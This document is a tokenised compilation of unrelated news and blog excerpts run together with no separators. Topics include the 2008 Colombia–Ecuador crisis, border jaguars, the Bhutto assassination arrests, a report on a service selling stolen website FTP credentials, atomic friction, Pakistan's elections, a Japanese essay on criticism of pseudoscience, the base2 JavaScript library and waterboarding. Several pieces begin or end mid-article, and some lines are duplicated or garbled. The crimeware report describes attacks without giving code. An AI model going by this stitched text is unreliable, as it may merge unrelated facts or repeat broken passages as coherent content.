Farc - the Revolutionary Armed Forces of Colombia - has been fighting for more than four decades with the declared aim of a fairer wealth distribution in Colombia .
They fund themselves largely through the cocaine trade , analysts say , while holding hundreds of kidnapped hostages for ransom and political ends .
We are accustomed to the lies of the Colombian government - whatever they say has no importance
Venezuelan Vice - President Ramon Carrizalez
Ecuador , which had already withdrawn its ambassador from Bogota and expelled Colombia 's from Quito , announced on Monday it would sever all diplomatic ties over the cross - border raid .
Shortly afterwards , Venezuela announced the Colombian ambassador and all other diplomats were being thrown out .
Ecuador has been flying troops by helicopter towards the border area , while Venezuela 's President Hugo Chavez said he was deploying tanks and troops on Venezuela 's border with Colombia .
Colombian allegations
As the crisis deepened , UN Secretary General Ban Ki-moon added his voice , expressing concern about " increased tensions and heightened rhetoric " in the region .
In Washington , a state department spokesman backed Colombia 's right to defend itself while urging dialogue .
Meanwhile , Colombia accused Ecuador and Venezuela of having ties with the Farc and said the rebels had tried to buy uranium .
The Colombian authorities said the information had come from documents found during Saturday 's raid on the rebel camp in Ecuador .
" When they mention negotiations for 50 kilos of uranium , this means that the Farc are taking big steps in the world of terrorism to become a global aggressor .
We 're not talking of domestic guerrilla but transnational terrorism , " said Colombian national police chief Oscar Naranjo at a news conference in Bogota .
Other documents showed that President Chavez had provided $ 300 m ( £ 151 m ) to the Farc , and had received funds from them many years earlier , he said .
And there was also evidence of links between the Farc and representatives of the Ecuadorean government , Gen Naranjo claimed .
But Venezuela and Ecuador poured scorn on the Colombian claims .
HAVE YOUR SAY Colombia and President Uribe have been fighting a civil war for 40 years , and it 's pretty bad .
Mr Uribe is trying very hard but these fallouts with other nations are dangerously ignorant and harmful to the region .
Alex Dominguez , Milwaukee
Venezuelan Vice - President Ramon Carrizalez said : " We are accustomed to the lies of the Colombian government .
Whatever they say has no importance . "
Ecuador 's President Correa also criticised Colombia , saying : " They said we had a pact with terrorists , and that is completely false . "
Colombia 's foreign minister earlier said he regretted that troops had to cross the border , but said it had been necessary " in the fight against terrorism " .
" The Colombian government has never wanted to disrespect or violate the sovereignty or integrity of the sister republic of Ecuador , " Fernando Araujo said .
Meanwhile , French Foreign Minister Bernard Kouchner said the death of rebel leader Reyes was " bad news " , as he had been France 's contact in its efforts to free Ms Betancourt .
Venezuelan President Chavez 's government also said he had been close on several occasions to a deal to free Ms Betancourt , who is said to be in very poor health .
Six Farc hostages have been released since Mr Chavez began efforts to win their freedom .
Colombia initially invited him to mediate , but later tried to exclude him from the process .

SANTA RITA MOUNTAINS , Arizona ( Reuters ) - Jaguar biologist Emil McCain stoops over a remote - sensing camera attached to a tree in these rugged mountains a few miles to the north of the Arizona - Mexico border .
The researcher is checking for images of a handful of extremely rare jaguars that prowl up from Mexico over mountain trails in some of the wildest country in the southwest , although they are now under threat .
Scrolling through images of bobcats and deer snapped by the camera , he explains how the habitat for one of the United States ’ most elusive predators is being pressured by illegal immigration from Mexico and the controversial remedies sought by the U.S. government to curb it : building fences .
In this election year , Washington hopes to complete 670 miles
of pedestrian fencing and vehicle barriers in a bid to seal off some of the most heavily crossed areas of the nearly 2,000 - mile border , despite opposition from some landowners and environmentalists .
“ The low flat valleys are effectively walled off to wildlife .
As a result everything is funneled up through the high mountain ranges that span the border ” McCain said , standing by the camera box in an area spotted with trash tossed by illegal immigrants .
“ The border barriers are directly linked with the funneling
of people into the last remaining habitats .
Jaguars are very solitary animals , they can’t move freely where there are a lot of people . ”

SOLITARY HUNTERS
Jaguars are powerful , solitary hunters that were revered by ancient cultures including the Aztecs and the Maya who believed they had supernatural powers .
They roam over a vast habitat ranging from northern Argentina in the south to the rugged , borderland wildernesses of Arizona and New Mexico , although they are rarely seen .
The sturdy , spotted cats -- which are the only roaring felines in the Americas -- were believed to have become extinct in the United States until an Arizona rancher photographed one he encountered while hunting mountain lions in the far southwest corner of New Mexico in 1996 .
“ It was unforgettable , probably the most exciting day I have had in my life , ” Warner Glenn said of his brush with the burly , roaring male jaguar , which his hounds briefly brought to bay on a pillar of rock in the Peloncillo Mountains .
Proof positive of their presence in the United States was gained six months later when another Arizona cougar hunter , Jack Childs , treed and photographed a second jaguar in the distant reaches of the Baboquivari Mountains southwest of Tucson .
“ They were on the brink of extirpation and to find out they were still here was a really great thing , ” Childs said of the animal , another male , which his hounds chased up into an alligator juniper tree .
“ It was indescribable , a life - changing experience .
We tipped our hats to it , thanked it for the experience and it went on its way . ”
NO BREEDING POPULATION
Neither jaguars were harmed .
The photographs taken by Glenn and Childs helped win federal protection for the animals as an endangered species the following year and stirred interest from researchers eager to find out about their population and movements .
Slideshow ( 3 images )
Childs , his wife Anna Mary and McCain subsequently founded the Borderlands Jaguar Detection Project , a nonprofit which set up some 40 to 50 cameras to photograph jaguars roaming through a highland wildlife corridor in the southwest known as the “ Sky Islands . ”
The mountainous archipelago linking Arizona with the Sierra Madre Mountains in northwest Mexico is a unique zone where temperate species like the wolf and black bear mingle with Neotropical animals such as the jaguar and coatimundi , a sociable raccoon - like animal sometimes mistaken for a monkey .
Over the past seven years researchers repeatedly photographed four or five jaguars .
They found that all were males straying north from breeding populations in Mexico , a discovery with considerable implications for their survival in the U.S. southwest .
“ Because there are no females and no reproduction , jaguars in the United States are totally dependent on cross - border movement , ” Said McCain .
“ That connectivity with Mexico is absolutely crucial . ”
UNCERTAIN FUTURE
As the construction of barriers continued to pressure that connectivity , the U.S. government decided at the start of the year to abandon the recovery of jaguar populations as a federal goal , further calling into question the future of the animals .
McCain says he is concerned that there is no conservation plan to protect the big cats and their core habitat in the United States , which , he says , leaves them increasingly vulnerable should any decision be taken in the future to secure remaining areas of the border with fencing .
“ After the Border Patrol finishes securing the lowland areas they will be forced to extend those walls out across the mountain ranges and totally seal off any hopes of jaguars crossing back and forth , ” he says .
While jaguars would not die out as a species -- fewer than one percent of their total number live in the United States -- losing this elusive predator would signal a retreat on protecting this fragile borderland wilderness for posterity .
“ The jaguar is a great emblem of wildness and an example of a healthy ecosystem , ” McCain said .
“ It really inspires people and creates a sense of wonder at the natural world .
And in today ’s world , we really need that . ”
ISLAMABAD ( Reuters ) - Pakistani police arrested on Friday another suspect in connection with the assassination of former prime minister Benazir Bhutto , a senior police investigator said .
“ Yes , we have arrested a suspect and we are interrogating him , ” said the investigator , who declined to be identified .
He identified the suspect as Abdul Rashid but declined to give further details .
Private Geo Television said Rashid was suspected of providing “ arms and ammunition ” to those involved in the attack on Bhutto .
The two - time prime minister was killed in a gun and bomb attack in the city of Rawalpindi on December 27 as she left an election rally .
Television footage showed a man firing three shots from a pistol at Bhutto moments before a bomb went off .
Pakistani and U.S. intelligence officials have blamed Baitullah Mehsud , an al Qaeda - linked militant commander based in a tribal region on the Afghan border , for the assassination .
Police said as well as the bomber , identified as Saeed , alias Bilal , four other militants were present in and around the venue of the rally in Rawalpindi .
Police said on Wednesday that two militants , Hasnain Gul and Rifaqat , were arrested last week and had confessed to giving a pistol and a suicide - bomb vest to the bomber .

Two of the five militants police said were at the scene of the attack were still at large , they said .
Last month , authorities arrested two suspects including a 15 - year - old - boy who admitted being a back - up suicide bomber if the Rawalpindi attack had failed .
The latest arrest came three days before general elections which were delayed from January 8 after Bhutto ’s murder .
Despite the explanations of the government as to how Bhutto was killed and who was responsible , supported at least in part by both the CIA and British police , many Pakistanis believe elements from the Pakistani government were involved in killing her .
Security researchers have uncovered a new web - based service containing security credentials for more than 8,700 websites belonging to Fortune 500 companies and government agencies .
It allows miscreants to infect some of the internet 's most popular destinations with a few clicks of the mouse .
According to security provider Finjan , the service categorizes the list of available sites by a variety of characteristics , including the country where they 're hosted and their popularity .
After paying a fee , criminals can select the domain they want to compromise and then use it as a means to infect vulnerable machines that later visit the site .
The service provides a menu of malware titles that can be pushed to unwitting visitors .
It also allows miscreants to upload custom exploits , according to Yuval Ben-Itzhak , chief technology officer at Finjan .
In a sense , this crimeware as a service ( CAAS ) was inevitable .
According to an earlier report from Finjan , more than 51 percent of websites that pushed malicious content in the second half of 2007 were legitimate destinations that had been commandeered by bad guys .
The service is evidence that there 's money to be made in automating that process - and one more sign that cyber - crime has grown into a full - fledged business where no opportunity to turn a profit is passed up .
" You can imagine the magnitude of this marketplace now , " he said in an interview .
" They really commercialize everything in this eco-system . "
About 10 of the compromised sites are among the 100 most popular internet destinations as measured by Alexa.com .
Another 100 are ranked in the top 100 to 500 .
Sites include some of the world 's more elite organizations , including companies in the financial services , manufacturing and technology industries .
They also include government agencies , including at least one belonging to a superior court in the US .
Most of the sites are located in the US .
Other origins included the Russian Federation , Australia , Ukraine , the Czech Republic and the UK .
Ben -Itzhak declined to identify the sites by name .
He said Finjan has so far alerted only about a dozen of the compromised sites .
Companies that want to find out if they 're on the list can contact a Finjan representative using this link .
The service is able to seamlessly infect the websites because it has a database containing file transfer protocol usernames , passwords and server addresses that are typically used by legitimate webmasters to add , change or delete pages .
The credentials were most likely stolen by infecting the PCs of administrators with keyloggers , Ben -Itzhak said .
A site called meoryprof.info has been used to access the service .
At te time of writing , it was inaccessible to us .
As long as the FTP credentials remain valid , you can bet it 's only a matter of time before the service pops up on another site . ®
Knowing the precise forces required to move atoms “ helps us to understand what is possible and what is not possible , ” said Andreas J. Heinrich , a physicist at Almaden and an author of the new Science paper .
“ It ’s a stepping stone for us , but it ’s by no means the end goal . ”

In the experiment , Dr. Heinrich and his collaborators at Almaden and the University of Regensburg in Germany used the sharp tip of an atomic force microscope to push a single atom .
To measure the force , the tip was attached to a small tuning fork , the same kind that is found in a quartz wristwatch .
In fact , in the first prototype , Franz J. Giessibl , a scientist at Regensburg who was a pioneer in the use of atomic force microscopes , bought an inexpensive watch and pulled out the quartz tuning fork for use in the experiment .
The tip vibrates 20,000 times a second until it comes into contact with an atom .
As the tip pushes , the tuning fork bends , like a diving board , and the vibration frequency dips .
A single atom does not roll , and even a perfectly smooth surface is not perfectly smooth .
Instead , the atom rests in small indentations in the lattice , in effect like an egg in an egg carton .
The resistance  what becomes friction when multiplied by millions and billions of atoms  comes from the energy needed to rearrange the bonds between the cobalt atom and surface .
When the tip pushes hard enough , the atom hops , almost instantaneously to the next indentation .
“ It ’s not smooth , ” said Markus Ternes , another Almaden scientist working on the research .
“ It ’s faster than we can detect . ”
The retired general who served as George Bush 's special envoy to deal with the Kurdistan Workers ' party ( PKK ) today said the US has failed to keep its promises to Turkey to confront the Kurdish group
Retired air force General Joseph Ralston declined to say why he stepped down several weeks ago .
But published reports have said that he was frustrated by the Bush administration 's failure to act against the PKK .
He said Turkey may feel that it has no choice but to attack the PKK in northern Iraq .
In his first extended comments since his departure , Gen Ralston told McClatchy Newspapers the US is unwittingly " driving , strategically , the Turks and the Iranians together " because both nations share concerns about Kurdish separatist groups .
" The US government should make good on the commitments they have made to the Turks , " Gen Ralston said .
The White House and the US military are wary about opening a new front in the war in Iraq - particularly in generally stable northern Iraq - by launching assaults against the PKK .
Neither the US - backed Iraqi government nor the semiautonomous Kurdish regional government has shown any inclination to go after the group .
The officer who commands U.S. forces in northern Iraq , Major General Benjamin Nixon , last week said he planned to do " absolutely nothing " to curb PKK activities .
Gen Ralston , a vice chairman of the Washington - based Cohen Group , a consulting firm , said the statement was " directly opposite " promises Mr Bush has made to Turkey .
Asked whether the Turkish military would invade northern Iraq , which PKK fighters use to launch attacks into Turkey , Gen Ralston said : " They 're going to have to , in the absence of the US doing anything . "
The rise in such deliveries , to about 26 percent today from 6 percent in 1970 , has failed to decrease the rate of cerebral palsy , scientists say .
Studies indicate that in most cases , the disorder is caused by fetal brain injury long before labor begins .
An examination of Mr. Edwards 's legal career also opens a window onto the world of personal injury litigation .
In building his career , Mr. Edwards underbid other lawyers to win promising clients , sifted through several dozen expert witnesses to find one who would attest to his claims , and opposed state legislation that would have helped all families with brain - damaged children and not just those few who win big malpractice awards .
In an interview on yesterday , Mr. Edwards did not dispute the contention that the use of fetal heart rate monitors leads to many unneeded Caesarean deliveries or that few cases of cerebral palsy are caused by mishandled deliveries .
But he said his cases , selected from hundreds of potential clients with the disorder , were exceptions .
' ' I took very seriously our responsibility to determine if our cases were merited , '' Mr. Edwards said .
'' Before I ever accepted a brain - injured child case , we would spend months investigating it . ''
As for the unneeded Caesareans , he said , '' The question is , would you rather have cases where that happens instead of having cases where you do n't intervene and a child either becomes disabled for life or dies in utero ? ''
A Talent for Trials
Lawyers in North Carolina agree that Mr. Edwards was an exceptionally talented lawyer , endowed with a prodigious work ethic , native self - confidence , good looks , charisma and an ability to talk about complicated subjects in accessible language .
That , said his former partner Wade M. Smith , is a lethal combination in a trial lawyer .
'' People do n't see him coming until it's too late , '' Mr. Smith said .
'' It 's true in politics and it was true in the law . ''

＃これはまあ当然だ。 「科学というモノサシ」を持っている人間にとっては、これは同じものを持っている人間の間なら判断基準を統一できる、客観的モノサシの一つにすぎない。別に科学者だからと言って科学以外の物事にまで同じモノサシを当てはめるわけじゃない。逆にいえば、科学に関する事柄について語るときには、このモノサシを持たない者は話をする資格は無いというか相手にされないわけだが。
ニセ科学が、科学が唯一絶対的な正しい真理であるという暗黙の（そして誤った）前提に支えられていることには同意する。ニセ科学の提唱者が、科学を自称したり、あるいは科学と誤認されやすい提示を行ったりするのは、世間一般の科学に対する信頼を利用しているであろう。もし科学が信頼されていないのなら、科学を自称するメリットはない。では、ニセ科学批判は、科学が唯一の真理であるという前提に立っているのだろうか？まさか、そんなことはない。別に科学が真理だとは思っていなくても、科学でないのに科学だと自称する主張をニセ科学だと批判することは可能だ。（それとも、「ニセ科学批判は、ニセ社会学に立脚している」という主張は、社会学が唯一の真理と思っていないとできないのか？）

ここ数か月ほど、なにやら疑似科学批判批判なるものがちょっと流行っていたようだ。正直言ってこれ自身には興味を引かれなかったのだが、いくつかの関連エントリを読んでいて気になったことがあったのでそれを書いてみることにする。疑似科学批判批判者の多くに共通して見られる反応の一つに、「疑似科学批判者は科学を絶対視している」というものがある。参考例：
ニセ科学批判者は科学を絶対視しているか？ - NATROM の日記 しかし批判者側の反応は往々にして「 はあ？意味不明 」
「 んなわけないだろ」というニュアンスのものに留まり、なぜ彼らがそう感じているのかという点にまで踏み込んだものはまだ見たことが無い。例えば上記エントリ内でNATROMさんは、批判対象の論宅氏に対し、以下のように書いている。「んなわけないだろ」型反応の一つの例である。たしかにこれはこれで正しい認識だと思うのだが、両者の間にある根源的な溝はもっと別のところにあると私は認識している。それをきちんと把握しないことには、「疑似科学批判批判者」の言うことをきちんと理解できたことにはならないと思う。相手の言うことを理解しきることなく批判しても、それは相手に届かないだろう、とも。何人もの「疑似科学批判批判者」が判で押したように同じ事を言うのだから、彼らにそう思わせる何かがあるはずなのだ。そんなわけで、この部分を少し分析してみることにした。さて、私の認識している疑似科学批判者とビリーバーの間にある最大の溝とは、である。「科学というモノサシ」とは何かと問われれば、要は検証されたデータと数字、そしてそれに基づく理論の事である。あるいは単に客観的評価基準としても良いかも知れない。我々がビリーバーと呼ぶ人達は、別にそれが「科学的だから」疑似科学を受け入れる訳ではない。確かに疑似科学に特有の「科学っぽいフレーズや数字」が、彼らが疑似科学を受け入れる理由の一つとなっているのは間違いない。それは確かに彼らに疑似科学を受け入れやすい「雰囲気」を作り出している。しかし「科学っぽいからみんな信じる」というのはあくまでもこちら側から見た時の主観であって、あちら側の心象的な理由とイコールなわけではない。なぜなら彼らは科学というモノサシを持っていないのだから。彼らが疑似科学を受け入れるのは、それが彼らなりの何らかの主観的モノサシに適ったからである。そして疑似科学批判は、彼らにとって、・よく分からんモノサシを問答無用で押しつけられた揚句・そのモノサシによって自分の信じたものを否定され、・さらには自分のモノサシ（価値判断基準）まで否定されたに等しい暴挙なのである。だからこそ彼らは、疑似科学批判者が「科学という絶対的モノサシ」を押し付けてくると感じるのである。少し前に起こった「水からの伝言」のボヤで、ぶいっちゃん氏やその取り巻きが批判に反発した理由がこれである。NATROM氏が取り上げている論宅氏の宣言も同じだ。というのは、別にメタ理論でも相対主義でもないのだ。これは、「お前らのモノサシなんて知るか！おれはこれからもおれのモノサシでやっていくんだ！」という、単なる「科学のモノサシ」の拒絶なわけである。疑似科学批判者にとって、疑似科学批判とは「科学」の領域に属するものである。「科学というモノサシ」を適用したら科学の枠外に外れるからこその「疑似」なのだからこれは当然だ。しかし不幸にして批判対象は往々にしてその事を理解していない。そして「自分のモノサシ」を手に「疑似科学批判批判」を行っている。「疑似科学批判」と「疑似科学批判批判」がまるでかみ合わない理由がここにある。「科学のモノサシ」という客観的な屋台骨を持つ疑似科学批判を前にしては、個々人の主観的モノサシによる「疑似科学批判批判」は単なる個人的反発の域を出ないのだ。「疑似科学批判批判」とは、突如「科学のモノサシ」を押しつけられ、自らのモノサシが否定されたと感じた彼らの、「比較対象間違ってませんか！？あなたの物差しはそれですか！？」「絶望した！科学のモノサシに絶望した！」という彼らなりの異議申し立てであり、悲鳴なのである。＜連絡事項

ATLANTA , Georgia ( CNN ) -- Gary Michael Hilton pleaded guilty Thursday to killing hiker Meredith Emerson , and was sentenced to life in prison .
Gary Michael Hilton was escorted into court Thursday under heavy security .
Hilton , 61 , wore an orange jumpsuit and bulletproof vest as he sat somberly through the sentencing .
He was charged with kidnapping with intent to harm and malice murder in Emerson 's January 4 death .
The 24 - year - old University of Georgia graduate disappeared on New Year 's Day while on a hike in the North Georgia mountains with her dog .
Emerson 's parents gave emotional statements in court .
" I feel that no punishment for Mr. Hilton is too great , " said her father , David Emerson .
" I only pray that he suffers immensely for his heinous acts . "
Susan Emerson , the victim 's mother , said she was not sorry that prosecutors took the death penalty off the table .
" I feel like he should stay alive and slowly rot , " she said .
" As far as I am concerned , there is no such thing as justice in this case .
Nothing will bring our daughter back . "
Watch the Emersons describe their feelings about Hilton »
Dr. Kris Sperry , the state 's chief medical examiner , concluded Emerson died of blunt force trauma to the head and was decapitated after death .
Witnesses said they saw Emerson on Georgia 's Blood Mountain with Hilton .
Days later , Hilton led authorities to her body , reportedly in a deal to avoid the death penalty .
" Anyone 's emotional reaction would have appropriately be that this defendant deserved the penalty of death , " said Lee Darragh , Hall County District Attorney at a news conference following Hilton 's plea .
But after much deliberation , research and consultation with other prosecutors , Darragh decided a life sentence " in practical terms " is a " death penalty in and of itself . "
" The most appropriate course was to have this defendant take responsibility for the death of Meredith Emerson through his guilty plea today , " he explained .
Hilton would not be eligible for parole until he is 91 years old .
" He will most likely die in prison and most certainly never see the light of day again , " said Darragh .
Emerson 's family agrees with the sentence , a family spokeswoman said .
" Today is the last day of a very long month , but January on its last day is a safer place than January on its first , " Peggy Bailey told reporters .
" There are sources of joy that will lead our families through the suffering and on to healing . "
Investigators also suspect Hilton in the October slaying of Irene Bryant and the presumed death of her husband , John , in Transylvania County , North Carolina , said Sheriff David Mahoney .
Authorities have n't specified what evidence they have .
Hilton also is the suspect in the death of Cheryl Dunlap , 46 , whose body was found in December in Apalachicola National Forest , southwest of Tallahassee , Florida , according to authorities .

Action Replay of Powerful Stellar Explosion
This combination of X -ray and optical images shows the aftermath of a powerful supernova explosion in the Large Magellanic Cloud ( LMC ) , a small galaxy about 160,000 light years from Earth .
The debris from this explosion , the supernova remnant SNR 0509 - 67.5 , is shown in a Chandra X - ray Observatory image ( upper inset ) , where the lowest energy X - rays are shown in red , the intermediate energies are green and the highest energies are blue .
In 2004 , scientists used Chandra to show that SNR 0509 - 67.5 was likely caused by a Type Ia supernova , using an analysis of the elements , such as silicon and iron , that were detected .
A Type Ia is thought to result from a white dwarf star in a binary system that reaches a critical mass and explodes .
The light echo image ( lower inset ) , from the Cerro Tololo Inter - American Observatory ( CTIO ) 4 - meter telescope , shows light from the original supernova explosion that has bounced off dust clouds in the neighboring regions of the LMC ( the light echoes are shown in blue and stars in orange ) .
The light from these echoes travels a longer path than the light that travels straight toward us , and so can be seen hundreds of years after the supernova itself .
This image is one of a sequence of five images taken between 2001 and 2006 that are shown separately in a time - lapse movie .
The large optical image is from the Magellanic Cloud Emission Line Survey ( MCELS ) , obtained with the 0.9 m telescope at CTIO .
Emission lines of hydrogen ( H - alpha ) are red , singly - ionized sulfur is green and doubly - ionized oxygen is blue .
The image highlights regions of star formation in the LMC , including supernova remnants and giant structures carved out by multiple supernovas .
For the first time astronomers have used two methods -- X - ray observations of a supernova remnant and optical observations of the expanding light echoes from the explosion -- to estimate the energy of a supernova blast .
In two separate papers , astronomers concluded that the supernova occurred about 400 years ago ( in Earth 's time frame ) , and was unusually bright and energetic .
This is the best ever determination of the power of a supernova explosion long after it was visible from Earth .
In the new optical study spectra of the light echo , obtained with Gemini Observatory , were used to confirm that the supernova was a Type Ia and to unambiguously determine the particular class of explosion and therefore its energy .
In the new X - ray study , spectra from Chandra and ESA 's XMM - Newton Observatory were then independently used to calculate the amount of energy involved in the original explosion , using an analysis of the supernova remnant and state - of - the - art explosion models .
The X - ray work also concluded that the explosion was an especially energetic and bright variety of Type Ia supernova , confirming the validity of the explosion models .

Mr Musharraf is now striking a conciliatory tone
He 'd railed against the opinion polls .
He 'd accused the media of bias .
But there 's not much President Musharraf can do about the voice of the people .
Pakistan 's voters have inflicted a heavy defeat on him and his supporters in parliament .
It could even threaten his political survival .
Why ?
Because Pakistanis have voted fairly clearly for change .
The next government will have to be a coalition , but it will have a strong democratic mandate .
And it will have to decide how it chooses to work with a president who 's never had much time for politicians with broad popular support .
The two main opposition parties - the Pakistan People 's Party ( PPP ) and the Pakistan Muslim League ( Nawaz ) ( PML - N ) - will have a dominant presence in the next parliament .
Together they could form a stable coalition , but political bargaining is only just beginning .
' Dictatorship '
There 's no doubt that the PML ( N ) - led by former Prime Minister Nawaz Sharif - is gunning for President Musharraf .
It has made that very clear throughout this election campaign .
" Musharraf said he would quit when people tell him , and people have now given their verdict , " said Mr Sharif in his first public statement after the results emerged .
He called upon opposition parties to unite " to rid the country of dictatorship " .
But the PPP has been less explicit .
Its co-chairman Asif Ali Zardari has been careful to keep his options open .
The party is still convinced that vote - rigging cost it many seats in this election , but it has n't yet ruled out working with anyone , including the president .
Many would be glad to see the back of the president " Our whole attempt here is to be in government so we can change the system , " said Sherry Rehman , the central information secretary of the PPP .
" And you have to slowly and transitionally change the system from within . "
And what about President Musharraf himself ?
What is his best strategy for dealing with the opposition ?
It could be divide and conquer .
But in what felt like an appeal to the opposition to give him another chance , he too has appealed for reconciliation .
" We need a stable and democratic political environment in this country , " he said in an election night appearance on state - run TV .
" That 's why I 've called this the mother of all elections . "
" All the political parties and leaders should realise that in Pakistan they should not have a confrontational approach . "
' Suffered enormously '
But the president is no longer arguing from a position of strength .
This election has shown how far his popularity has fallen during the political turmoil of the past year .
Now the man who has enjoyed the support of western countries for the best part of a decade looks weaker than ever .
Many analysts believe his days are numbered .
But if any lasting benefit is to emerge from this election , all Pakistan 's politicians will have to prove that they have learnt from the mistakes of the past .
" The country has suffered enormously , " said Tariq Fatemi , a former ambassador and political analyst .
" The kind of polarisation that you see in Pakistan today is unprecedented . "
Mr Zardari 's party is playing its cards carefully " In two of the four provinces there is virtual state of insurgency .
There is alienation , anger and outrage .
Unless the two sides rise to the occasion , the country could be facing very choppy waters . "
So big questions remain .
Will a new government try to free senior judges who are still under house arrest and will it begin to heal domestic political wounds ?
Will it be able to focus on the challenge from pro-Taleban militancy which has threatened the stability of this country and spread concern around the world ?
In the short term , much depends on the approach of the PPP , which looks set to be the biggest party in parliament .
But it is still reeling from the assassination of Benazir Bhutto in December .
There is no - one of her stature left in the current party leadership .
Whatever government eventually emerges from the horse - trading , it will face tremendous challenges .
Rising instability , highlighted by a spate of suicide bombings and the Islamist insurgency near the Afghan border , has meant plenty of international attention has been focussed on this election .
Now , many people will now be looking to the victors to give the country a fresh start .

base2 : An Introduction
I ’ve been working on base2 for a couple of years now and it is finally ready for a beta release .
With base2 I aim to solve various problems with inconsistent JavaScript implementations and add a little sugar to the language at the same time .
These are the problems that I ’ve tried to solve :
Inconsistent enumeration across platforms
instanceof does n’t always work
does n’t always work typeof is inconsistent ( RegExps identify as type “ function ” in Mozilla browsers )
is inconsistent ( RegExps identify as type “ function ” in Mozilla browsers ) Consistent object / platform detection
Other various bugs
And the sugar :
And I ’ve tried to adhere to my own rules for JavaScript library development as much as possible .
Here is a brief outline of the base2 API .
In subsequent blog posts I ’ll drill into specific classes and functions in more detail .
Classes / Modules / Packages
Base
The base class for inheritance .
Based on my old Base class .
Map A hash class .
Based on ES4’s Map. Collection A Map that is more array - like .
Items may be referenced by index as well by key .
RegGrp A Collection of regular expressions and their associated replacement values .
For building powerful parsers .
Module A mechanism for grouping functions that operate on particular types of object .
I will explain this in more detail in a later blog post .
Package A mechanism for grouping functions and classes .
base2.DOM is an example of a Package .
I will provide an overview of this class in a later blog post .
Enumerable A Module that defines useful methods for enumeration ( map , filter , etc ) .
JavaScript A Package that defines optional extensions to JavaScript ’s built - in objects ( Array2 , Date2 and String2 ) .
Functions
I wo n’t bother to describe the functions here you can read the online documentation for more information .
Hopefully , you can guess what most of the functions do .
I will explain some of them in more detail in a later blog post .
assignID , detect , Undefined , Null , True , False
Summary
base2 is a lightweight library that irons out all the annoying differences in JavaScript implementations .
It provides the additional functionality from JavaScript 1.6 + that only Mozilla browsers implement .
It also adds some features from ES4 .
The library is only 6KB ( gzipped ) .
You can download it from googlecode or link to it directly from your web page :
http://base2.googlecode.com/svn/version/1.0(beta2)/base2-p.js ( minified )
http://base2.googlecode.com/svn/version/1.0(beta2)/src/base2.js ( source code )
As previously mentioned , I intend to showcase some of the features of base2 in individual blog posts .
Stay tuned .

Unless something is going really , really wrong with Google , we have a suspicion this is just an upcoming April Fool 's joke for Google .
If that 's the case , then note that spoilers follow below .
OK .
Remember Microsoft's Clippy , that annoying " living " and talking paper clip , popping up with useless tips whenever you wanted to get some work done in Word ?
It looks like Google Docs is preparing integrating a similar feature called Cliply .
Instead of a paper clip , this time it 's a living Google logo ( cached image ) .
And it probably will be just as annoying as Clippy was .
The following code showed up live in the source of a Google Docs document ...
if ( writely.Vars.getSiteVar('enable_cliply ' ) )
{ // Beta document.getElementById(' newlogo').src = '/images/cliply.gif ' ; writely .Cliply.init( { ' strength ' : 0.4 , ' dexterity ' : 0.9 , ' constitution ' : 0.7 , ' intelligence ' : 0.1 , ' wisdom ' : 0.3 , ' charisma ' : 0.8} ) ; }
But again , before you sign in to Google to delete your account forever , remember ( even when Google 's apps are moving in the direction of Microsoft Office ) this is very likely just an April Fool 's prank or general easter egg by Google engineers .
If not , then be scared , very , very scared ... as Clippy is about to return !

This government does not torture .
— George W. Bush
All right !
Waterboarding is a very unpleasant experience , which is sometimes fatal .
I can also imagine that a small percentage of root canals are fatal , but no one routinely refers to them as torture — just very unpleasant .
That said , if I were grabbed off the street by five guys in ski masks who jabbed a hypodermic in my neck , threw me in the back of a van , stripped me to gooseflesh , gave me an enema and jammed a wad of cotton where only a proctoscope belongs , forced me into diapers and an orange jumpsuit , plugged my ears , duck - taped my eyes and put a sack over my head , shackled me in a stress position to the cold , aluminum deck of an unheated cargo plane for 15 hours , strapped me in a chair at some black dental site in Karachi and commenced the root canal in a shower of Punjabi expletives … then okay , maybe taken in toto I ’d consider that experience torture .
On February 13 the Senate narrowly passed — on a 51 - 45 party - line vote — an intelligence bill that will , among other things , ban waterboarding as an “ enhanced interrogation technique , ” a Bush - era euphemism for torture .
Republican presidential candidate John McCain , who was tortured as a prisoner of the North Vietnamese , traded his principled stance against waterboarding for a White House endorsement of his candidacy and voted against the ban .
Torture is now officially a plank in the GOP platform .
Democratic candidates Hillary Clinton and Barak Obama were too busy campaigning to go on congressional record as either supporting or opposing the ban .
Such a narrow political plurality against the torture of a human being is possible in an overly - religious nation because of the mistaken notion that torturing a person begins and ends with “ waterboarding ” and because that term sounds a lot like “ waterslide ” and “ water park . ”
Who has n’t gotten water up the nose while playing in a pool but still enjoyed the overall experience ?
Dick Cheney refers to waterboarding as “ a dunk in the water . ”
Attorney General Mukasey refuses to call it torture unless , of course , it ’s happening to him .
Senator Joe Lieberman ( D - Conn . ) defended his vote against the ban on waterboarding by saying , “ It is not like putting burning coals on people ’s bodies .
The person is in no real danger … the impact is psychological . ”
I have news for Mr. Lieberman .
If I were strapped in a straitjacket and locked in a 2x3x7 foot box , the exquisite psychological pain of that experience would find no rival in burning coals .
And I would say anything to make it stop .
Torture , physical or psychological , is about as singularly personal an experience as birth and death .
Waterboarding has become the cause célèbre in the torture controversy that began in this country with the revelation of tortured Iraqi detainees at Abu Ghraib .
Considering the attention it gets — 3,810,000
Google hits — one can be forgiven for thinking it is the only “ enhanced interrogation technique ” being used .
In reality , it is only the most benign sounding of the Bush - era chamber of horrors , which includes , but is not limited to : electric shock , hypothermia , heat injuries , forced sexual acts , prolonged stress positions , beatings , dog attacks , withholding food , water , and medical attention , sleep depravation , sensory overload , and mock execution .
We have already become a nation “ comfortable ” with the idea that waterboarding is torture .
In a November 2007 CNN poll , 68 percent of the respondents agreed that waterboarding constitutes torture .
But only 58 percent of the respondents believe the U.S. should not use the technique .
For now , there is a narrow moral plurality against its use .
Waterboarding is the thin edge of the wedge that will work its way into the political and moral discussion and slowly , but inexorably , desensitize the nation to the overt and covert use of all forms of torture .
Torture will become a “ regrettable ” but necessary weapon in the war on terror , much as the madness of “ mutual assured destruction ” was thought to be integral to surviving the Cold War .
Once in the arsenal , torture , like nuclear missiles , will become an unassailable tool of national defense .
Keep in mind , a particular torture technique is not applied in isolation , but is part of a longer torturing experience that includes kidnapping , extraordinary rendition , prolonged isolation , denial of legal rights , no communication with family , draconian sentences , loss of hope , psychosis , suicide , and execution .
Keep in mind also that too often the victims of a torturing experience are the innocent , the constitutionally protected dissenter , the political opponent , the disenfranchised … the children of the disappeared .
On June 18 , 1940 the Russia army invaded Lithuania and began arresting community leaders and intellectuals .
My aunt ’s mother was a librarian , one of her town ’s intellectuals .
She was arrested and charged with espionage .
